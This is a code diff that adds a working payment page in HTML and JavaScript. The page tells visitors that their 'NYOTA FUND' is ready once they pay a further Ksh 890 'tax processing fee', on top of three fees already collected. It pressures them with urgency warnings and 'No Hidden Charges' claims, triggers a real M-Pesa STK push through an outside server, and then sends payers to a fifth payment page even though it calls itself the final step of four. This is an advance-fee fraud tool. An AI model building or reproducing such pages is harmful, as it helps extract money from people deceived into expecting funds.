@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Final Step – Tax Processing</title>
+<link rel="stylesheet" href="style.css">
+
+<style>
+.container{
+  max-width:420px;
+  margin:auto;
+  padding:18px;
+}
+
+.card{
+  background: rgba(255,255,255,0.05);
+  border-radius:14px;
+  padding:20px;
+  backdrop-filter: blur(10px);
+  box-shadow:0 6px 25px rgba(0,0,0,0.25);
+  text-align:center;
+}
+
+.step{
+  font-size:13px;
+  color:#aaa;
+  margin-bottom:8px;
+}
+
+.success{
+  color:#4ade80;
+  margin:6px 0;
+}
+
+.highlight{
+  color:#4ade80;
+  font-weight:bold;
+}
+
+.warning{
+  color:#facc15;
+  font-weight:bold;
+}
+
+.secure{
+  font-size:13px;
+  color:#aaa;
+  margin-top:10px;
+}
+
+/* Popup */
+#popupOverlay{
+  display:none;
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.6);
+  z-index:999;
+}
+
+.popupContent{
+  background:#fff;
+  color:#111;
+  max-width:360px;
+  padding:20px;
+  border-radius:14px;
+  text-align:center;
+  position:fixed;
+  left:50%;
+  top:50%;
+  transform:translate(-50%,-50%);
+}
+
+.spinner{
+  border:4px solid #eee;
+  border-top:4px solid #0a6ebd;
+  border-radius:50%;
+  width:30px;
+  height:30px;
+  animation:spin 1s linear infinite;
+  margin:10px auto;
+}
+
+@keyframes spin{100%{transform:rotate(360deg);}}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+  <div class="card">
+
+    <div class="step">Final Step (4 of 4)</div>
+
+    <h2>Final Tax Processing</h2>
+
+    <div class="success">✔ Processing fee paid</div>
+    <div class="success">✔ Cross-network fee paid</div>
+    <div class="success">✔ Commitment fee paid</div>
+
+    <p>🎉 You're almost done! Your NYOTA FUND is ready for release.</p>
+
+    <p>
+      To complete your transaction, a 
+      <strong>Ksh 890 Tax Processing Fee</strong> is required.
+    </p>
+
+    <p class="highlight">
+      ✅ This payment finalizes your process and enables immediate fund release.
+    </p>
+
+    <p>
+      Once confirmed, your funds will be fully processed and prepared for disbursement.
+    </p>
+
+    <p class="warning">
+      ⚠️ Complete this final step now to avoid delays or cancellation.
+    </p>
+
+    <form id="taxForm">
+      <input id="phone" placeholder="07XXXXXXXX" required>
+      <button type="submit">Complete Payment (Ksh 890)</button>
+    </form>
+
+    <p class="secure">
+      🔒 Secure M-Pesa Payment • Instant Confirmation • No Hidden Charges
+    </p>
+
+  </div>
+</div>
+
+<!-- POPUP -->
+<div id="popupOverlay">
+  <div class="popupContent">
+    <h3 id="popupTitle"></h3>
+    <div id="popupSpinner"></div>
+    <p id="popupMessage"></p>
+    <button id="popupBtn">OK</button>
+  </div>
+</div>
+
+<script>
+
+/* ==================================
+   PROTECT ACCESS
+================================== */
+if (!localStorage.getItem("payment3Completed")) {
+  window.location.href = "payment3.html";
+}
+
+/* ==================================
+   CONFIG
+================================== */
+const API_BASE = "https://optima-server-isaac.onrender.com";
+const TAX_AMOUNT = 890;
+
+/* ==================================
+   ELEMENTS
+================================== */
+const phoneInput = document.getElementById("phone");
+const taxForm = document.getElementById("taxForm");
+
+const popupOverlay = document.getElementById("popupOverlay");
+const popupTitle = document.getElementById("popupTitle");
+const popupSpinner = document.getElementById("popupSpinner");
+const popupMessage = document.getElementById("popupMessage");
+const popupBtn = document.getElementById("popupBtn");
+
+/* ==================================
+   LOAD USER PHONE
+================================== */
+const userPhone = localStorage.getItem("userPhone");
+
+if (userPhone) {
+  phoneInput.value = userPhone;
+  phoneInput.readOnly = true;
+}
+
+/* ==================================
+   POPUP
+================================== */
+function showPopup(title, msg = "", spin = false, ok = false) {
+
+  popupTitle.innerText = title;
+  popupMessage.innerHTML = msg;
+
+  popupSpinner.innerHTML = spin
+    ? '<div class="spinner"></div>'
+    : '';
+
+  popupBtn.style.display = ok ? "block" : "none";
+
+  popupOverlay.style.display = "block";
+}
+
+popupBtn.onclick = () => {
+  popupOverlay.style.display = "none";
+};
+
+/* ==================================
+   PHONE FORMAT
+================================== */
+function normalizePhone(input) {
+
+  const digits = input.replace(/\D/g, "");
+
+  if (digits.startsWith("07") || digits.startsWith("01")) {
+    return "254" + digits.slice(1);
+  }
+
+  if (digits.startsWith("7") || digits.startsWith("1")) {
+    return "254" + digits;
+  }
+
+  if (digits.startsWith("254")) {
+    return digits;
+  }
+
+  return null;
+}
+
+/* ==================================
+   SUBMIT PAYMENT
+================================== */
+taxForm.addEventListener("submit", async (e) => {
+
+  e.preventDefault();
+
+  const phone = normalizePhone(phoneInput.value.trim());
+
+  if (!phone) {
+    alert("Enter a valid Safaricom number");
+    return;
+  }
+
+  showPopup(
+    "Processing...",
+    "Sending STK Push to your phone.",
+    true,
+    false
+  );
+
+  try {
+
+    const res = await fetch(
+      `${API_BASE}/stk-push`,
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          phone,
+          amount: TAX_AMOUNT
+        })
+      }
+    );
+
+    const data = await res.json();
+
+    console.log("STK RESPONSE:", data);
+
+    const checkoutId =
+      data.checkout_request_id ||
+      data.CheckoutRequestID;
+
+    if (!checkoutId) {
+      throw new Error("Missing checkout ID");
+    }
+
+    localStorage.setItem(
+      "payment4_checkout_id",
+      checkoutId
+    );
+
+    showPopup(
+      "STK Sent 📲",
+      "Enter your M-Pesa PIN.",
+      true,
+      false
+    );
+
+    pollPayment(checkoutId);
+
+  } catch (err) {
+
+    console.error(err);
+
+    showPopup(
+      "Payment Failed ❌",
+      "Unable to send STK Push.",
+      false,
+      true
+    );
+  }
+});
+
+/* ==================================
+   POLLING
+================================== */
+function pollPayment(checkoutId) {
+
+  let attempts = 0;
+
+  const interval = setInterval(async () => {
+
+    attempts++;
+
+    if (attempts > 60) {
+
+      clearInterval(interval);
+
+      return showPopup(
+        "Still Processing ⏳",
+        "Please wait a little longer.",
+        false,
+        true
+      );
+    }
+
+    try {
+
+      const res = await fetch(
+        `${API_BASE}/check-status`,
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            checkout_request_id: checkoutId
+          })
+        }
+      );
+
+      const data = await res.json();
+
+      console.log("STATUS:", data);
+
+      const status =
+        data.status?.toLowerCase();
+
+      if (status === "pending") {
+        return;
+      }
+
+      clearInterval(interval);
+
+      if (status === "completed") {
+
+        localStorage.removeItem(
+          "payment4_checkout_id"
+        );
+
+        localStorage.setItem(
+          "payment4Completed",
+          "yes"
+        );
+
+        showPopup(
+          "Payment Confirmed ✅",
+          `
+          Tax fee received successfully.<br><br>
+          Transaction Code:<br>
+          <strong>
+          ${data.transaction_code || "Confirmed"}
+          </strong><br><br>
+          Redirecting...
+          `,
+          false,
+          false
+        );
+
+        setTimeout(() => {
+          window.location.replace(
+            "payment5.html"
+          );
+        }, 2500);
+
+      } else {
+
+        localStorage.removeItem(
+          "payment4_checkout_id"
+        );
+
+        showPopup(
+          "Payment Failed ❌",
+          data.message || "Payment not completed.",
+          false,
+          true
+        );
+      }
+
+    } catch (err) {
+
+      console.log("Polling error:", err);
+    }
+
+  }, 2000);
+}
+
+/* ==================================
+   RESUME POLLING
+================================== */
+const savedCheckoutId =
+  localStorage.getItem(
+    "payment4_checkout_id"
+  );
+
+if (savedCheckoutId) {
+  pollPayment(savedCheckoutId);
+}
+
+      </script>
+
+</body>
+</html>
